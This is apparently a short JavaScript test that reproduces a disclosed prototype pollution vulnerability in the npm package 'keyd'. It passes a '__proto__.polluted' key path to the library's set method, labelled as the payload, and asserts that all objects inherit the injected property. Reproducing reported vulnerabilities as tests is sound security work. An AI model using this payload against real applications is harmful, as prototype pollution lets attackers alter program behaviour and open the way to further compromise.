//https://hackerone.com/reports/877515
test("prototype pollution in keyd", () => {
  expect({}.polluted).toBe(undefined);

  const keyd = require("keyd");
  keyd({}).set("__proto__.polluted", "yes"); //payload

  expect({}.polluted).toBe("yes");
});
